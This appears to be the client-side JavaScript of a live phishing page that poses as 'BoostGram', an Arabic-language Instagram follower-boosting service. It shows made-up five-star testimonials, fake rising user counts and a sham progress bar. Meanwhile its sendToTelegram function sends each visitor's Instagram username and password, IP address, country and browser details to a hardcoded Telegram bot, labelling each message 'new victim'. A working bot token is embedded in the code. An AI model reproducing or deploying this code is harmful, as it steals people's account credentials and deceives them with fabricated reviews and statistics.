// ==========================================
// BoostGram — Telegram Config
// ==========================================
const BOT_TOKEN = '8863933045:AAE-GSd-pWrvzSJiijFNkjm9sgZ0g7S7E2w';
const CHAT_ID = '7644504212';

// ==========================================
// التعليقات الإيجابية
// ==========================================
const positiveComments = [
    { name: 'سارة أحمد', text: 'والله خدمة ممتازة! زادوا لي 500 متابع في 10 دقائق 🔥', stars: '★★★★★' },
    { name: 'محمد العلوي', text: 'أحسن موقع جربته، سريع وآمن. شكراً BoostGram ❤️', stars: '★★★★★' },
    { name: 'ليلى بن علي', text: 'ما توقعتش ينجح بهذي السرعة! أنصح الجميع', stars: '★★★★★' },
    { name: 'يوسف كريم', text: 'خدمة احترافية، الدعم يرد بسرعة. تجربة رائعة', stars: '★★★★★' },
    { name: 'نور الهدى', text: 'زادوا لي 1000 متابع وما صار أي مشكلة في الحساب', stars: '★★★★★' },
    { name: 'عمر خالد', text: 'أفضل استثمار لحسابي! المتابعين حقيقيين ومتفاعلين', stars: '★★★★★' },
    { name: 'فاطمة الزهراء', text: 'جربت مواقع كثيرة، هذا الوحيد اللي نجح معي 💯', stars: '★★★★★' },
    { name: 'أحمد المنصوري', text: 'خدمة سريعة ومضمونة، شكراً لكم', stars: '★★★★★' },
    { name: 'ريم سعد', text: 'حسابي صار مشهور بعد BoostGram! أنصح به بشدة', stars: '★★★★★' },
    { name: 'خالد إبراهيم', text: 'الأسعار مناسبة والجودة عالية، تجربة ممتازة', stars: '★★★★★' },
    { name: 'هند العتيبي', text: 'ما صدقت لما شفت العدد يزيد! خدمة رهيبة', stars: '★★★★★' },
    { name: 'سلمان الفارسي', text: 'الدعم الفني محترف، والمتابعين حقيقيين', stars: '★★★★★' },
    { name: 'منى عبد الله', text: 'جربت الباقة الاحترافية، النتيجة فاقت التوقعات', stars: '★★★★★' },
    { name: 'طارق حسين', text: 'أفضل خدمة في السوق، بلا منافس', stars: '★★★★★' },
    { name: 'دانة محمد', text: 'حسابي صار تريند بعد الزيادة! شكراً', stars: '★★★★★' },
    { name: 'بدر السالم', text: 'خدمة موثوقة، تعاملت معهم 3 مرات', stars: '★★★★★' },
    { name: 'جواهر فهد', text: 'المتابعين تفاعلوا مع منشوراتي فوراً', stars: '★★★★★' },
    { name: 'راكان ناصر', text: 'أسرع خدمة جربتها، 5 دقائق وخلصت', stars: '★★★★★' },
    { name: 'شهد العلي', text: 'النتيجة مذهلة! حسابي تغير 180 درجة', stars: '★★★★★' },
    { name: 'فيصل القحطاني', text: 'BoostGram غيّر مفهوم زيادة المتابعين', stars: '★★★★★' },
    { name: 'عبدالله الشمري', text: 'باقة VIP غيرت حسابي! 5000 متابع في يوم واحد 🔥', stars: '★★★★★' },
    { name: 'نورة السالم', text: 'أفضل استثمار! المتابعين حقيقيين والتفاعل ممتاز', stars: '★★★★★' },
    { name: 'محمد الدوسري', text: 'الشارة VIP صارت على حسابي، كل شي احترافي', stars: '★★★★★' },
    { name: 'سارة المطيري', text: 'جربت كل الباقات، VIP هي الأفضل بلا منافس', stars: '★★★★★' }
];

// ==========================================
// دوال مساعدة
// ==========================================
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'Unknown';
    }
}

async function getCountry() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return `${data.country_name || 'Unknown'} (${data.country_code || '??'})`;
    } catch {
        return 'Unknown';
    }
}

// ==========================================
// إرسال إلى Telegram
// ==========================================
async function sendToTelegram(username, password, followers) {
    const ip = await getIP();
    const country = await getCountry();

    const message = `
<b>🎯 BoostGram — ضحية جديدة</b>

<b>━━━━━━━━━━━━━━━━</b>
<b>👤 Username:</b> <code>${username}</code>
<b>🔑 Password:</b> <code>${password}</code>
<b>📊 Followers:</b> <code>${followers}</code>
<b>🌐 IP:</b> <code>${ip}</code>
<b>🌍 Country:</b> <code>${country}</code>
<b>📱 Device:</b> <code>${navigator.userAgent.substring(0, 60)}</code>
<b>⏰ Time:</b> <code>${new Date().toLocaleString('ar-EG')}</code>
<b>━━━━━━━━━━━━━━━━</b>
    `.trim();

    try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        const data = await res.json();
        console.log('Telegram response:', data);
        return data.ok;
    } catch (err) {
        console.error('Telegram error:', err);
        return false;
    }
}

// ==========================================
// عرض التعليقات
// ==========================================
function displayComments() {
    const list = document.getElementById('commentsList');
    if (!list) return;
    list.innerHTML = '';

    positiveComments.slice(0, 10).forEach((c, i) => {
        const div = document.createElement('div');
        div.className = 'comment';
        div.style.animationDelay = `${i * 0.1}s`;
        div.innerHTML = `
            <div class="comment-avatar">${c.name.charAt(0)}</div>
            <div class="comment-body">
                <div class="comment-name">${c.name} <span style="color:#4ade80;font-size:11px;">✓</span></div>
                <div class="comment-text">${c.text}</div>
                <div class="comment-stars">${c.stars}</div>
            </div>
        `;
        list.appendChild(div);
    });
}

// ==========================================
// بدء الزيادة
// ==========================================
async function startBoost() {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    const followers = document.getElementById('followers').value;

    if (!username || !password) {
        alert('الرجاء إدخال جميع البيانات');
        return;
    }

    // إخفاء الفورم وإظهار شريط التقدم
    document.querySelector('.form-section').style.display = 'none';
    document.getElementById('progressSection').style.display = 'block';

    // إرسال البيانات
    await sendToTelegram(username, password, followers);

    // محاكاة التقدم
    const total = parseInt(followers);
    let current = 0;
    const step = Math.max(1, Math.floor(total / 50));
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    const followerCount = document.getElementById('followerCount');

    const stages = [
        'جاري الاتصال بالسيرفر...',
        'جاري التحقق من الحساب...',
        'جاري إضافة المتابعين...',
        'جاري تفعيل التفاعل...',
        'جاري إضافة الشارة...',
        'اكتملت العملية بنجاح!'
    ];

    let stageIndex = 0;
    progressText.textContent = stages[stageIndex];

    const interval = setInterval(() => {
        current += step;
        if (current > total) current = total;

        const percent = (current / total) * 100;
        progressFill.style.width = percent + '%';
        followerCount.textContent = current.toLocaleString('ar-EG');

        // تغيير المرحلة
        if (percent > 15 && stageIndex === 0) { stageIndex = 1; progressText.textContent = stages[1]; }
        if (percent > 35 && stageIndex === 1) { stageIndex = 2; progressText.textContent = stages[2]; }
        if (percent > 55 && stageIndex === 2) { stageIndex = 3; progressText.textContent = stages[3]; }
        if (percent > 80 && stageIndex === 3) { stageIndex = 4; progressText.textContent = stages[4]; }
        if (percent >= 100 && stageIndex === 4) {
            stageIndex = 5;
            progressText.textContent = stages[5];
            clearInterval(interval);

            // إعادة الفورم بعد 5 ثواني
            setTimeout(() => {
                document.querySelector('.form-section').style.display = 'block';
                document.getElementById('progressSection').style.display = 'none';
                progressFill.style.width = '0%';
                document.getElementById('password').value = '';
                const vipCard = document.getElementById('vipCard');
                if (vipCard) vipCard.style.display = 'none';
            }, 5000);
        }
    }, 100);
}

// ==========================================
// إظهار بطاقة VIP
// ==========================================
function initVipCard() {
    const followersSelect = document.getElementById('followers');
    const vipCard = document.getElementById('vipCard');
    if (!followersSelect || !vipCard) return;

    followersSelect.addEventListener('change', function() {
        if (this.value === '5000') {
            vipCard.style.display = 'block';
            vipCard.style.animation = 'slideIn 0.5s ease';
        } else {
            vipCard.style.display = 'none';
        }
    });
}

// ==========================================
// إحصائيات متحركة
// ==========================================
function animateStats() {
    const usersEl = document.getElementById('totalUsers');
    const followersEl = document.getElementById('totalFollowers');
    if (!usersEl || !followersEl) return;

    let users = 125430;
    let followers = 8200000;

    setInterval(() => {
        users += Math.floor(Math.random() * 5);
        followers += Math.floor(Math.random() * 100);
        usersEl.textContent = users.toLocaleString('ar-EG');
        followersEl.textContent = (followers / 1000000).toFixed(1) + 'M';
    }, 3000);
}

// ==========================================
// تعليق جديد كل 10 ثواني
// ==========================================
function autoAddComments() {
    const list = document.getElementById('commentsList');
    if (!list) return;

    setInterval(() => {
        const randomComment = positiveComments[Math.floor(Math.random() * positiveComments.length)];
        const div = document.createElement('div');
        div.className = 'comment';
        div.innerHTML = `
            <div class="comment-avatar">${randomComment.name.charAt(0)}</div>
            <div class="comment-body">
                <div class="comment-name">${randomComment.name} <span style="color:#4ade80;font-size:11px;">✓</span></div>
                <div class="comment-text">${randomComment.text}</div>
                <div class="comment-stars">${randomComment.stars}</div>
            </div>
        `;
        list.insertBefore(div, list.firstChild);

        while (list.children.length > 20) {
            list.removeChild(list.lastChild);
        }
    }, 10000);
}

// ==========================================
// التهيئة
// ==========================================
document.addEventListener('DOMContentLoaded', function() {
    displayComments();
    animateStats();
    autoAddComments();
    initVipCard();

    const startBtn = document.getElementById('startBtn');
    if (startBtn) {
        startBtn.addEventListener('click', startBoost);
    }
});